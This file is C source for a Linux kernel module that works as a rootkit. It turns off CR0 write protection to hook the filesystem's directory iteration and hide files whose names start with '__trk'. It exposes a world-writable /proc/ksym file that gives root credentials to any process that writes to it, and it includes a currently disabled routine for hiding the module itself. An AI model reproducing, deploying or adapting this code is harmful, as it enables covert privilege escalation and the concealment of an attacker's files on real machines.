/* Compile with:
make -C <path to kernel src> M=$PWD
*/

#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/string.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>

#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/thread_info.h>
#include <linux/sched.h>

static struct proc_dir_entry *procfs_entry;

static int (*intercepted_iterate) (struct file *, struct dir_context *);

/**
 * Disable write protection:
 *
 * Disable interrupts entirely while we're writing so that we don't get
 * preempted by code that relies on the zone we're writing to being RO.
 * Then clear the WP flag of CR0.
 */
static void disable_wprotect(void)
{
	asm volatile("cli;"
		     "movq %cr0, %rax;"
		     "andq $0xFFFFFFFFFFFEFFFF, %rax;"
		     "movq %rax, %cr0;");
}

static void enable_wprotect(void)
{
	asm volatile("movq %cr0, %rax;"
		     "orq $0x10000, %rax;"
		     "movq %rax, %cr0;"
		     "sti;");
}

static filldir_t good_filldir;
static int bad_filldir(struct dir_context *ctx, const char *name, int namlen,
			loff_t offset, u64 ino, unsigned int d_type)
{
	printk(KERN_DEBUG "Bad filldir!");
	if (!strncmp("__trk", name, 5))
		return 0;
	return good_filldir(ctx, name, namlen, offset, ino, d_type);
}

static int trk_iterate(struct file *fd, struct dir_context *ctx)
{
	int err;

	filldir_t p = bad_filldir;
	
	good_filldir = ctx->actor;

	/* Pollute ctx with the bad filldir */
	memcpy((void *)(&(ctx->actor)), (void *)&p, sizeof p);

	err = intercepted_iterate(fd, ctx);

	/* Restore old actor so that we don't look suspicious */
	p = good_filldir;
	memcpy((void *)(&(ctx->actor)), (void *)&p, sizeof p);

	printk(KERN_DEBUG "Intercepted iterate op.");

	return err;
}

static void module_hide(void)
{
	printk(KERN_DEBUG "Hiding temporarily disabled.");
	return;
	
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}

static int fs_setup_intercept(void)
{
	struct file *boot_filp;
	struct file_operations *fs_ops;

	boot_filp = filp_open("/boot", O_RDONLY, 0);
	if (!boot_filp)
		return -1;
	
	fs_ops = (struct file_operations *)(boot_filp->f_op);
	filp_close(boot_filp, NULL);

	intercepted_iterate = fs_ops->iterate;
	printk(KERN_DEBUG "fs_ops: %p", fs_ops);
	printk(KERN_DEBUG "fs_ops->iterate: %p", fs_ops->iterate);
	printk(KERN_DEBUG "Replacing with: %p", trk_iterate);

	disable_wprotect();
	fs_ops->iterate = trk_iterate;
	enable_wprotect();
	return 0;
}

static ssize_t pfs_op_write(struct file *file, const char __user *buffer,
			    size_t count, loff_t *ppos)
{
	struct cred *credentials;

	credentials = prepare_creds();

	printk(KERN_DEBUG "Altering credentials of %d", current->pid);
	credentials->uid.val = 0;
	credentials->euid.val = 0;
	credentials->gid.val = 0;
	credentials->egid.val = 0;
	commit_creds(credentials);
	return count;
}

static const struct file_operations pfs_ops = {
	.write = pfs_op_write,
};

static void procfs_setup(void)
{
	procfs_entry = proc_create("ksym", S_IWUSR | S_IWOTH, NULL, &pfs_ops);
}

static int __init trk_init(void)
{
	printk(KERN_DEBUG "Hiding...");
	module_hide();
	fs_setup_intercept();
	procfs_setup();
	printk(KERN_DEBUG "Loaded.");
	return 0;
}

static void __exit trk_exit(void)
{
	/* Restore the old operation */
	struct file *boot_filp;
	struct file_operations *fs_ops;

	boot_filp = filp_open("/boot", O_RDONLY, 0);
	if (!boot_filp)
		return;
	
	printk(KERN_DEBUG "Got filp");
	fs_ops = (struct file_operations *)(boot_filp->f_op);
	filp_close(boot_filp, NULL);

	disable_wprotect();
	fs_ops->iterate = intercepted_iterate;
	enable_wprotect();

	proc_remove(procfs_entry);
	
	printk(KERN_DEBUG "Unloaded...");
}

module_init(trk_init);
module_exit(trk_exit);

//MODULE_LICENSE("GPL")
